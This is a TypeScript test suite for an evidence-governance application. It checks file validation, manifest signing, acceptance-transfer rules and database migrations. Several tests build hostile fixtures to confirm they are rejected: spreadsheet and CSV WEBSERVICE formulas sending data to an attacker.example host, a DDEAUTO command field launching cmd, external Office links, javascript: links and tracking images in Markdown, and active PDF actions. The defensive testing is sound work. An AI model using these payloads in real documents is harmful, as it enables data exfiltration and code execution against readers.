import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { DatabaseSync } from "node:sqlite";
import test from "node:test";
import { jsPDF } from "jspdf";
import JSZip from "jszip";
import { briefSourceHash } from "../lib/brief-publication.js";
import { EvidenceValidationError, evidenceContentHash, evidenceHashFromAuditPayload, readBoundedObjectBytes, validateEvidenceBytes } from "../lib/evidence-validation.js";
import { demoEnabledFromValue, readRuntimePolicy } from "../lib/runtime-policy.js";
import { signWorkspaceManifest, verifyWorkspaceManifestSignature, workspaceSigningConfig } from "../lib/workspace-signing.js";
import { enforceAcceptanceTransferInvariants } from "../lib/acceptance-transfer.js";
import { evidenceDocumentReferences } from "../lib/evidence-references.js";

const read = (path: string) => readFileSync(path, "utf8");
const encoder = new TextEncoder();
const packageRelationship = (target: string) => `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="${target}"/></Relationships>`;

async function sha256Hex(value: string) {
  const digest = await crypto.subtle.digest("SHA-256", encoder.encode(value));
  return [...new Uint8Array(digest)].map((byte) => byte.toString(16).padStart(2, "0")).join("");
}

function passivePdfBytes() {
  const pdf = new jsPDF({ unit: "pt", format: "letter" });
  pdf.text("Synthetic security-validation fixture", 54, 72);
  const bytes = new Uint8Array(pdf.output("arraybuffer"));
  const text = new TextDecoder("latin1").decode(bytes);
  const catalogOpenAction = text.lastIndexOf("/OpenAction [");
  assert.ok(catalogOpenAction > 0);
  bytes.set(encoder.encode("/A2OInitial"), catalogOpenAction);
  return bytes;
}

function insertBeforeFinalStartXref(bytes: Uint8Array, token: string) {
  const text = new TextDecoder("latin1").decode(bytes);
  const marker = text.lastIndexOf("startxref");
  assert.ok(marker > 0);
  return encoder.encode(`${text.slice(0, marker)}${token}\n${text.slice(marker)}`);
}

function classicPdfBytes(objects: string[]) {
  let text = "%PDF-1.4\n";
  const offsets: number[] = [];
  for (let index = 0; index < objects.length; index += 1) {
    offsets.push(text.length);
    text += `${index + 1} 0 obj\n${objects[index]}\nendobj\n`;
  }
  const crossReferenceOffset = text.length;
  text += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  text += offsets.map((offset) => `${String(offset).padStart(10, "0")} 00000 n \n`).join("");
  text += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${crossReferenceOffset}\n%%EOF\n`;
  return encoder.encode(text);
}

test("runtime policy is explicit and demonstration loading fails closed", () => {
  const local = readRuntimePolicy({ AUTH_MODE: "local-single-user", DEMO_ENABLED: "false", WORKSPACE_TRANSFER_MODE: "local", STEWARD_USER_IDS: "" });
  assert.equal(local.authMode, "local-single-user");
  assert.equal(local.workspaceTransferMode, "local");
  assert.equal(local.demoEnabled, false);
  const sites = readRuntimePolicy({ AUTH_MODE: "sites", DEMO_ENABLED: "true", WORKSPACE_TRANSFER_MODE: "disabled", STEWARD_USER_IDS: "owner-1,owner-2" });
  assert.deepEqual([...sites.stewardUserIds], ["owner-1", "owner-2"]);
  assert.equal(sites.demoEnabled, true);
  for (const value of [undefined, null, "TRUE", "1", "yes", true]) assert.equal(demoEnabledFromValue(value), false);
  assert.throws(() => readRuntimePolicy({ AUTH_MODE: "", WORKSPACE_TRANSFER_MODE: "disabled" }));
  assert.throws(() => readRuntimePolicy({ AUTH_MODE: "sites", WORKSPACE_TRANSFER_MODE: "local" }));
});

test("evidence SHA-256 helpers normalize valid audit hashes only", async () => {
  assert.equal(await evidenceContentHash(encoder.encode("abc")), "sha256:ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
  assert.equal(evidenceHashFromAuditPayload('{"contentHash":"SHA256:BA7816BF8F01CFEA414140DE5DAE2223B00361A396177A9CB410FF61F20015AD"}'), "sha256:ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
  assert.equal(evidenceHashFromAuditPayload('{"contentHash":"not-a-hash"}'), null);
  assert.equal(evidenceHashFromAuditPayload("invalid-json"), null);
});

test("stored-object reads enforce metadata and streaming byte caps before allocation", async () => {
  let metadataRejectedCanceled = false;
  const metadataRejected = new ReadableStream<Uint8Array>({
    pull(controller) { controller.enqueue(new Uint8Array(64)); controller.close(); },
    cancel() { metadataRejectedCanceled = true; },
  });
  await assert.rejects(() => readBoundedObjectBytes({ body: metadataRejected, size: 64 }, { maxBytes: 5, expectedBytes: 5 }), /governed byte count/i);
  assert.equal(metadataRejectedCanceled, true);

  let streamRejectedCanceled = false;
  const streamRejected = new ReadableStream<Uint8Array>({
    start(controller) { controller.enqueue(new Uint8Array([1, 2, 3, 4])); controller.enqueue(new Uint8Array([5, 6, 7, 8])); },
    cancel() { streamRejectedCanceled = true; },
  });
  await assert.rejects(() => readBoundedObjectBytes({ body: streamRejected }, { maxBytes: 5, expectedBytes: 5 }), /governed byte limit/i);
  assert.equal(streamRejectedCanceled, true);

  const exact = new ReadableStream<Uint8Array>({ start(controller) { controller.enqueue(new Uint8Array([1, 2, 3])); controller.close(); } });
  assert.deepEqual([...new Uint8Array(await readBoundedObjectBytes({ body: exact, size: 3 }, { maxBytes: 3, expectedBytes: 3 }))], [1, 2, 3]);
});

test("PDF evidence validation accepts passive output and rejects escaped active names, object streams, and truncation", async () => {
  const passive = passivePdfBytes();
  assert.equal((await validateEvidenceBytes("passive.pdf", passive)).contentType, "application/pdf");
  await assert.rejects(() => validateEvidenceBytes("escaped-action.pdf", insertBeforeFinalStartXref(passive, "/Open#41ction 1 0 R")), EvidenceValidationError);
  await assert.rejects(() => validateEvidenceBytes("escaped-object-stream.pdf", insertBeforeFinalStartXref(passive, "/Obj#53tm 1")), EvidenceValidationError);
  await assert.rejects(() => validateEvidenceBytes("external-link.pdf", insertBeforeFinalStartXref(passive, "/URI (https://example.invalid)")), EvidenceValidationError);
  await assert.rejects(() => validateEvidenceBytes("truncated.pdf", passive.slice(0, passive.byteLength - 8)), EvidenceValidationError);
  const stringShell = classicPdfBytes([
    "(foo /Type /Catalog /Pages 2 0 R)",
    "(foo /Type /Pages /Count 1 /Kids [3 0 R])",
    "(foo /Type /Page)",
  ]);
  await assert.rejects(() => validateEvidenceBytes("string-shell.pdf", stringShell), /actual standalone dictionaries/i);
  const commentShell = classicPdfBytes(["<< /Type /NotCatalog >>\n% /Type /Catalog /Pages 2 0 R"]);
  await assert.rejects(() => validateEvidenceBytes("comment-shell.pdf", commentShell), /not a document catalog/i);
  const streamShell = classicPdfBytes(["<< /Length 36 >>\nstream\n/Type /Catalog /Pages 2 0 R\nendstream"]);
  await assert.rejects(() => validateEvidenceBytes("stream-shell.pdf", streamShell), /actual standalone dictionaries/i);
});

test("Office and CSV evidence reject external formulas, encoded relationships, and active fields", async () => {
  const workbook = new JSZip();
  workbook.file("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>');
  workbook.file("_rels/.rels", packageRelationship("xl/workbook.xml"));
  workbook.file("xl/workbook.xml", '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>');
  workbook.file("xl/worksheets/sheet1.xml", '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c><f><![CDATA[WEBSERVICE("https://attacker.example/collect")]]></f><v>0</v></c></row></sheetData></worksheet>');
  await assert.rejects(() => workbook.generateAsync({ type: "uint8array" }).then((bytes) => validateEvidenceBytes("active.xlsx", bytes)), EvidenceValidationError);
  const utf16Formula = '<?xml version="1.0" encoding="UTF-16"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c><f>WEBSERVICE("https://attacker.example/collect")</f></c></row></sheetData></worksheet>';
  workbook.file("xl/worksheets/sheet1.xml", new Uint8Array([0xff, 0xfe, ...Buffer.from(utf16Formula, "utf16le")]));
  await assert.rejects(() => workbook.generateAsync({ type: "uint8array" }).then((bytes) => validateEvidenceBytes("utf16-active.xlsx", bytes)), EvidenceValidationError);

  const document = new JSZip();
  document.file("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>');
  document.file("_rels/.rels", packageRelationship("word/document.xml"));
  document.file("word/document.xml", '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:fldSimple w:instr="DDEAUTO cmd | /c calc ! A1"/></w:body></w:document>');
  await assert.rejects(() => document.generateAsync({ type: "uint8array" }).then((bytes) => validateEvidenceBytes("active-field.docx", bytes)), EvidenceValidationError);
  document.file("word/document.xml", '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:instrText>INCLUDE</w:instrText></w:r><w:r><w:instrText>TEXT "https://attacker.example/collect"</w:instrText></w:r></w:p></w:body></w:document>');
  await assert.rejects(() => document.generateAsync({ type: "uint8array" }).then((bytes) => validateEvidenceBytes("split-field.docx", bytes)), EvidenceValidationError);
  document.file("word/document.xml", '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p/></w:body></w:document>');
  document.file("word/_rels/document.xml.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attacker.example/collect" TargetMode="Exter&#x6e;al"/></Relationships>');
  await assert.rejects(() => document.generateAsync({ type: "uint8array" }).then((bytes) => validateEvidenceBytes("active-link.docx", bytes)), EvidenceValidationError);

  await assert.rejects(() => validateEvidenceBytes("active.csv", encoder.encode('name,value\r\nitem,"=WEBSERVICE(""https://attacker.example/collect"")"')), EvidenceValidationError);
  assert.equal((await validateEvidenceBytes("values.csv", encoder.encode("name,delta\r\nitem,-12.5"))).contentType, "text/csv; charset=utf-8");
});

test("Office validation recognizes standards-compliant punctuation in namespace prefixes", async () => {
  const workbook = new JSZip();
  workbook.file("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>');
  workbook.file("_rels/.rels", packageRelationship("xl/workbook.xml"));
  workbook.file("xl/workbook.xml", '<?xml version="1.0"?><x.foo:workbook xmlns:x.foo="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>');
  workbook.file("xl/worksheets/sheet1.xml", '<x-foo:worksheet xmlns:x-foo="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><x-foo:f><![CDATA[WEBSERVICE("https://attacker.example/collect")]]></x-foo:f></x-foo:worksheet>');
  const bytes = await workbook.generateAsync({ type: "uint8array" });
  await assert.rejects(() => validateEvidenceBytes("punctuated-prefix.xlsx", bytes), /values-only evidence/i);
});

test("Markdown evidence rejects active HTML, embedded images, and executable links", async () => {
  const active = encoder.encode('# Evidence\n<img src="https://attacker.example/track">\n[run](javascript:alert(1))');
  await assert.rejects(() => validateEvidenceBytes("active.md", active), /raw HTML|external or executable/i);
  await assert.rejects(() => validateEvidenceBytes("image.md", encoder.encode("![remote](https://attacker.example/pixel.png)")), /embedded images/i);
  await assert.rejects(() => validateEvidenceBytes("reference-link.md", encoder.encode("[run][payload]\n\n[payload]: javascript:alert(1)")), /external or executable/i);
  await assert.rejects(() => validateEvidenceBytes("encoded-link.md", encoder.encode("[run](jav&#x61;script&colon;alert(1))")), /external or executable/i);
  await assert.rejects(() => validateEvidenceBytes("reference-image.md", encoder.encode("![pixel][payload]\n\n[payload]: data:image/png;base64,AA==")), /embedded images/i);
  const passive = await validateEvidenceBytes("passive.md", encoder.encode("# Evidence\nSource locator: https://example.invalid/reference\n[local evidence](/api/documents?id=document-1)"));
  assert.equal(passive.contentType, "text/markdown; charset=utf-8");
  const passiveReference = await validateEvidenceBytes("passive-reference.md", encoder.encode("[local evidence][artifact]\n\n[artifact]: /api/documents?id=document-1"));
  assert.equal(passiveReference.contentType, "text/markdown; charset=utf-8");
});

test("Evidence validation rejects signature-only images, empty Office ZIPs, and fake PDF shells", async () => {
  await assert.rejects(() => validateEvidenceBytes("empty.png", new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10])), /PNG evidence is truncated/i);
  await assert.rejects(() => validateEvidenceBytes("empty.jpg", new Uint8Array([0xff, 0xd8, 0xff])), /JPEG evidence is truncated/i);
  const fakePdf = encoder.encode("%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\nxref\nstartxref\n58\n%%EOF\n");
  await assert.rejects(() => validateEvidenceBytes("fake.pdf", fakePdf), EvidenceValidationError);
  for (const fixture of [
    { name: "empty.docx", root: "word/document.xml" },
    { name: "empty.xlsx", root: "xl/workbook.xml" },
    { name: "empty.pptx", root: "ppt/presentation.xml" },
  ]) {
    const zip = new JSZip();
    zip.file("[Content_Types].xml", "");
    zip.file("_rels/.rels", "");
    zip.file(fixture.root, "");
    await assert.rejects(() => zip.generateAsync({ type: "uint8array" }).then((bytes) => validateEvidenceBytes(fixture.name, bytes)), EvidenceValidationError);
  }
  const commentedMetadata = new JSZip();
  commentedMetadata.file("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><!-- <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/> --></Types>');
  commentedMetadata.file("_rels/.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><!-- <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/> --></Relationships>');
  commentedMetadata.file("word/document.xml", '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"></w:document>');
  await assert.rejects(() => commentedMetadata.generateAsync({ type: "uint8array" }).then((bytes) => validateEvidenceBytes("comment-shell.docx", bytes)), /does not declare|does not resolve/i);
  commentedMetadata.file("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>');
  await assert.rejects(() => commentedMetadata.generateAsync({ type: "uint8array" }).then((bytes) => validateEvidenceBytes("comment-relationship-shell.docx", bytes)), /does not resolve/i);
});

test("Evidence validation accepts structurally complete PNG and JPEG fixtures", async () => {
  const png = await validateEvidenceBytes("application-preview.png", readFileSync("public/og.png"));
  assert.equal(png.contentType, "image/png");
  const jpegBytes = Buffer.from("/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAACAAIDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD7V/Z2+C3w91v9n74ZajqPgTwzf6heeF9MuLm7utHt5JZ5XtImd3dkJZmJJJJySSTRRRXyOL/3ip/if5nwmO/3qr/il+bP/9k=", "base64");
  const jpeg = await validateEvidenceBytes("camera-sample.jpg", jpegBytes);
  assert.equal(jpeg.contentType, "image/jpeg");
});

test("Frozen evidence references normalize encoded document identifiers", () => {
  assert.deepEqual(evidenceDocumentReferences("[evidence](/api/documents?id=%64ocument-abc)"), ["document-abc"]);
  assert.deepEqual(evidenceDocumentReferences("[evidence](/api/documents?id=document-abc)"), ["document-abc"]);
  assert.deepEqual(evidenceDocumentReferences("[evidence](/api/documents?%69d=document-abc)"), ["document-abc"]);
  assert.deepEqual(evidenceDocumentReferences("[evidence](/api/documents?view=frozen&id=document-abc)"), ["document-abc"]);
  assert.throws(() => evidenceDocumentReferences("[evidence](/api/documents?id=%ZZ)"), /malformed evidence-document reference/);
  assert.throws(() => evidenceDocumentReferences("[broken evidence](/api/documents?view=frozen)"), /malformed evidence-document reference/);
});

test("workspace manifests require a trusted HMAC and exact manifest bytes", async () => {
  const config = workspaceSigningConfig({ WORKSPACE_TRANSFER_SIGNING_KEY_ID: "a2o-test-key", WORKSPACE_TRANSFER_SIGNING_KEY: "0123456789abcdef0123456789abcdef" });
  const manifest = { packageType: "a2o.workspace-transfer", packageVersion: "4.0.0", nested: { z: 2, a: 1 } };
  const manifestText = `${JSON.stringify(manifest, null, 2)}\n`;
  const envelope = await signWorkspaceManifest(manifestText, manifest, config);
  assert.equal((await verifyWorkspaceManifestSignature(manifestText, manifest, envelope, config)).keyId, config.keyId);
  await assert.rejects(() => verifyWorkspaceManifestSignature(manifestText.trim(), manifest, envelope, config), /manifest hash is invalid/);
  await assert.rejects(() => verifyWorkspaceManifestSignature(manifestText, manifest, envelope, { ...config, keyId: "a2o-other-key" }), /untrusted key identifier/);
  await assert.rejects(() => verifyWorkspaceManifestSignature(manifestText, manifest, null, config), /missing or malformed/);
  const tampered = { ...manifest, packageVersion: "3.0.0" };
  const tamperedText = `${JSON.stringify(tampered, null, 2)}\n`;
  const tamperedEnvelope = { ...envelope, manifestSha256: await sha256Hex(tamperedText) };
  await assert.rejects(() => verifyWorkspaceManifestSignature(tamperedText, tampered, tamperedEnvelope, config), /signature is invalid/);
});

test("acceptance transfer rejects invalid current closure and demotes signed legacy closure", () => {
  const currentEvidence = new Set(["document-valid", "document-quarantined"]);
  assert.throws(() => enforceAcceptanceTransferInvariants({
    criteria: [{ id: "criterion-current", status: "passed", evidence_reference: null }],
    signoffs: [{ id: "signoff-current", criterion_id: "criterion-current", decision: "accepted", decided_at: "2026-08-23", evidence_document_id: "document-quarantined" }],
    evidenceDocumentIds: currentEvidence,
    quarantinedDocumentIds: new Set(["document-quarantined"]),
    currentPackage: true,
  }), /fails the current evidence policy/);
  assert.throws(() => enforceAcceptanceTransferInvariants({
    criteria: [{ id: "criterion-current", status: "passed", evidence_reference: null }],
    signoffs: [{ id: "signoff-current", criterion_id: "criterion-current", decision: "accepted", evidence_document_id: "document-missing" }],
    evidenceDocumentIds: currentEvidence,
    quarantinedDocumentIds: new Set(),
    currentPackage: true,
  }), /not present in the package/);
  assert.throws(() => enforceAcceptanceTransferInvariants({
    criteria: [{ id: "criterion-current", status: "passed", evidence_reference: null }],
    signoffs: [],
    evidenceDocumentIds: currentEvidence,
    quarantinedDocumentIds: new Set(),
    currentPackage: true,
  }), /does not retain current governed evidence support/);

  const criteria = [
    { id: "criterion-missing", status: "passed", evidence_reference: null },
    { id: "criterion-quarantined", status: "passed", evidence_reference: "" },
    { id: "criterion-valid", status: "passed", evidence_reference: null },
    { id: "criterion-text", status: "passed", evidence_reference: "External verification register" },
  ];
  const signoffs = [
    { id: "signoff-missing", criterion_id: "criterion-missing", decision: "accepted", decided_at: "2026-08-20", evidence_document_id: "document-missing" },
    { id: "signoff-quarantined", criterion_id: "criterion-quarantined", decision: "waived", decided_at: "2026-08-21", evidence_document_id: "document-quarantined" },
    { id: "signoff-valid", criterion_id: "criterion-valid", decision: "accepted", decided_at: "2026-08-22", evidence_document_id: "document-valid" },
  ];
  const summary = enforceAcceptanceTransferInvariants({ criteria, signoffs, evidenceDocumentIds: currentEvidence, quarantinedDocumentIds: new Set(["document-quarantined"]), currentPackage: false });
  assert.deepEqual({ detached: summary.detachedEvidenceSignoffs, signoffs: summary.demotedCompletedSignoffs, criteria: summary.demotedPassedCriteria }, { detached: 1, signoffs: 2, criteria: 2 });
  assert.deepEqual(signoffs.map((item) => [item.id, item.decision, item.decided_at, item.evidence_document_id]), [
    ["signoff-missing", "pending", null, null],
    ["signoff-quarantined", "pending", null, "document-quarantined"],
    ["signoff-valid", "accepted", "2026-08-22", "document-valid"],
  ]);
  assert.deepEqual(criteria.map((item) => [item.id, item.status]), [
    ["criterion-missing", "in_verification"],
    ["criterion-quarantined", "in_verification"],
    ["criterion-valid", "passed"],
    ["criterion-text", "passed"],
  ]);
});

test("acceptance migration repairs existing rows and enforces governed evidence joins", () => {
  const database = new DatabaseSync(":memory:");
  database.exec(`
    CREATE TABLE program (id text PRIMARY KEY);
    CREATE TABLE incumbent_objective (id text PRIMARY KEY, program_id text NOT NULL);
    CREATE TABLE acceptance_criterion (id text PRIMARY KEY, objective_id text NOT NULL, status text NOT NULL, evidence_reference text, updated_at text NOT NULL);
    CREATE TABLE acceptance_signoff (id text PRIMARY KEY, criterion_id text NOT NULL, decision text NOT NULL, evidence_document_id text, decided_at text, updated_at text NOT NULL);
    CREATE TABLE evidence_document (id text PRIMARY KEY, content_type text NOT NULL, description text);
    CREATE TABLE audit_event (id text PRIMARY KEY, program_id text NOT NULL, actor_id text, action text NOT NULL, entity_kind text NOT NULL, entity_id text NOT NULL, before_payload text, after_payload text, created_at text NOT NULL);
    INSERT INTO program VALUES ('program-jsf');
    INSERT INTO incumbent_objective VALUES ('objective-1','program-jsf');
    INSERT INTO evidence_document VALUES ('document-valid','application/pdf','Verified'),('document-quarantined','application/octet-stream','[QUARANTINED LEGACY EVIDENCE — VERIFY BEFORE OPENING]');
    INSERT INTO acceptance_criterion VALUES
      ('criterion-missing','objective-1','passed',NULL,'before'),
      ('criterion-quarantined','objective-1','passed',NULL,'before'),
      ('criterion-unsupported','objective-1','passed',NULL,'before'),
      ('criterion-valid','objective-1','passed',NULL,'before'),
      ('criterion-text','objective-1','passed','Test report 1','before');
    INSERT INTO acceptance_signoff VALUES
      ('signoff-missing','criterion-missing','accepted','document-missing','before','before'),
      ('signoff-quarantined','criterion-quarantined','waived','document-quarantined','before','before'),
      ('signoff-valid','criterion-valid','accepted','document-valid','before','before');
  `);
  database.exec(read("drizzle/0026_acceptance_evidence_invariants.sql"));

  assert.deepEqual({ ...database.prepare("SELECT decision,evidence_document_id,decided_at FROM acceptance_signoff WHERE id='signoff-missing'").get() }, { decision: "pending", evidence_document_id: null, decided_at: null });
  assert.deepEqual({ ...database.prepare("SELECT decision,evidence_document_id,decided_at FROM acceptance_signoff WHERE id='signoff-quarantined'").get() }, { decision: "pending", evidence_document_id: "document-quarantined", decided_at: null });
  assert.deepEqual(database.prepare("SELECT id,status FROM acceptance_criterion ORDER BY id").all().map((row) => ({ ...row })), [
    { id: "criterion-missing", status: "in_verification" },
    { id: "criterion-quarantined", status: "in_verification" },
    { id: "criterion-text", status: "passed" },
    { id: "criterion-unsupported", status: "in_verification" },
    { id: "criterion-valid", status: "passed" },
  ]);
  assert.equal(database.prepare("SELECT count(*) AS count FROM audit_event WHERE action LIKE 'acceptance_%compatibility_%'").get()?.count, 5);
  assert.throws(() => database.exec("UPDATE acceptance_criterion SET status='passed' WHERE id='criterion-unsupported'"), /requires retained governed evidence/);
  assert.throws(() => database.exec("INSERT INTO acceptance_signoff VALUES ('signoff-dangling','criterion-text','accepted','document-missing','now','now')"), /evidence document does not exist/);
  assert.throws(() => database.exec("DELETE FROM acceptance_signoff WHERE id='signoff-valid'"), /cannot delete the last governed evidence sign-off/);
  database.close();
});

test("brief source hash is stable across insertion order and changes with governed content", async () => {
  const common = { id: "brief-1", title: "Decision brief", bodyMarkdown: "# Decision\nProceed" };
  const left = { asOf: "2026-08-23", handlingMarking: "PROGRAM WORKING DATA — DRAFT / UNCONTROLLED" as const, releaseName: "Release 1", sourceRows: 1, products: 1, releases: 1, reviewRows: 0, productNames: ["Product"], linkedRecords: [] };
  const right = { linkedRecords: [], productNames: ["Product"], reviewRows: 0, releases: 1, products: 1, sourceRows: 1, releaseName: "Release 1", handlingMarking: "PROGRAM WORKING DATA — DRAFT / UNCONTROLLED" as const, asOf: "2026-08-23" };
  assert.equal(await briefSourceHash({ ...common, snapshot: left }), await briefSourceHash({ ...common, snapshot: right }));
  assert.notEqual(await briefSourceHash({ ...common, snapshot: left }), await briefSourceHash({ ...common, bodyMarkdown: "# Decision\nHold", snapshot: left }));
});

test("evidence cleanup completion resolves only its exact pending audit", () => {
  const database = new DatabaseSync(":memory:");
  database.exec(`CREATE TABLE audit_event (
    id TEXT PRIMARY KEY, program_id TEXT NOT NULL, action TEXT NOT NULL,
    entity_kind TEXT NOT NULL, entity_id TEXT NOT NULL,
    after_payload TEXT, created_at TEXT NOT NULL
  );
  INSERT INTO audit_event VALUES
    ('pending-old','program-jsf','evidence_object_cleanup_pending','evidence_object','document-1','{"r2Key":"evidence/old"}','2026-08-23T10:00:00Z'),
    ('pending-new','program-jsf','evidence_object_cleanup_pending','evidence_object','document-1','{"r2Key":"evidence/new"}','2026-08-23T10:01:00Z'),
    ('completed-old','program-jsf','evidence_object_cleanup_completed','evidence_object','document-1','{"pendingAuditId":"pending-old"}','2026-08-23T10:02:00Z');`);
  const unresolved = database.prepare(`SELECT pending.id FROM audit_event pending
    WHERE pending.program_id='program-jsf'
      AND pending.action='evidence_object_cleanup_pending'
      AND NOT EXISTS (
        SELECT 1 FROM audit_event completed
        WHERE completed.program_id=pending.program_id
          AND completed.action='evidence_object_cleanup_completed'
          AND completed.entity_kind='evidence_object'
          AND json_valid(completed.after_payload)=1
          AND json_extract(completed.after_payload,'$.pendingAuditId')=pending.id
      ) ORDER BY pending.id`).all().map((row) => ({ ...row }));
  assert.deepEqual(unresolved, [{ id: "pending-new" }]);
  database.close();
});

test("host authentication, bootstrap, publication, quarantine, and transfer controls are wired fail closed", () => {
  const worker = read("worker/index.ts");
  const governance = read("lib/governance-server.ts");
  const publicationRoute = read("app/api/brief-publications/route.ts");
  const publicationServer = read("lib/brief-publication-server.ts");
  const briefPage = read("app/briefs/[id]/page.tsx");
  const documents = read("app/api/documents/route.ts");
  const decisionServer = read("lib/initiative-decision-server.ts");
  const reportServer = read("lib/initiative-report-server.ts");
  const initiativePage = read("app/initiatives/[initiative]/page.tsx");
  const transfer = read("lib/workspace-transfer.ts");
  const cleanup = read("lib/evidence-cleanup.ts");
  const cleanupRoute = read("app/api/evidence-cleanup/route.ts");
  const diagnosticsRoute = read("app/api/diagnostics/route.ts");
  const acceptanceMigration = read("drizzle/0026_acceptance_evidence_invariants.sql");
  const baselineImport = read("app/api/baseline/import/route.ts");
  assert.match(worker, /policy\.authMode === "sites"/);
  assert.match(worker, /policy\.authMode === "local-single-user"/);
  assert.doesNotMatch(worker, /const localRequest = isLocalHost/);
  assert.match(governance, /default_viewer/);
  assert.match(governance, /runtime_allowlist/);
  assert.match(baselineImport, /!replaceActiveBaseline && \(usesReservedDemonstrationName \|\| reservedDemonstrationKeys\)/);
  assert.match(baselineImport, /replaceActiveBaseline && \(!usesReservedDemonstrationName \|\| reservedDemonstrationKeys !== incoming\.length\)/);
  assert.doesNotMatch(governance, /COUNT\(\*\).*program_role_assignment/);
  assert.match(publicationServer, /prepareBriefPdf/);
  assert.match(publicationServer, /validateEvidenceBytes/);
  assert.doesNotMatch(publicationRoute, /formData\(|expectedContentHash|instanceof File/);
  assert.doesNotMatch(briefPage, /record_brief_publication/);
  assert.match(documents, /x-evidence-integrity/);
  assert.match(documents, /QUARANTINED LEGACY EVIDENCE/);
  assert.match(documents, /requireSteward\(actor\)[\s\S]*seal_integrity/);
  assert.match(documents, /evidence_integrity_sealed/);
  assert.match(governance, /sealedDocumentIds/);
  assert.match(governance, /integritySealed: sealedDocumentIds\.has/);
  assert.match(decisionServer, /evidenceIntegrityStatus/);
  assert.match(decisionServer, /storedEvidenceIntegrityMatches/);
  assert.match(decisionServer, /must validate and seal or reattach it before it can support acceptance/);
  assert.match(reportServer, /storedEvidenceIntegrityMatches/);
  assert.match(initiativePage, /Integrity seal recorded; bytes reverified on use/);
  assert.match(publicationServer, /verifyReferencedEvidence/);
  assert.match(publicationServer, /under-marked and must be regenerated before publication/);
  assert.match(publicationServer, /storedEvidenceIntegrityMatches/);
  assert.match(publicationRoute, /readBoundedObjectBytes/);
  assert.match(transfer, /verifyWorkspaceManifestSignature[\s\S]*isManifest/);
  assert.match(transfer, /evidence_integrity_sealed/);
  assert.match(transfer, /workspace package is unsigned and cannot be trusted/i);
  assert.match(transfer, /applyAcceptanceTransferPolicy/);
  assert.match(transfer, /workspace_package_acceptance_compatibility_adjusted/);
  assert.match(transfer, /Current workspace packages must use the fail-closed PROGRAM WORKING DATA classification/);
  assert.match(transfer, /readBoundedObjectBytes/);
  assert.match(transfer, /evidence_document_restored[\s\S]*declaredContentType[\s\S]*restoredContentType[\s\S]*quarantined/);
  assert.match(acceptanceMigration, /acceptance_criterion_compatibility_demoted/);
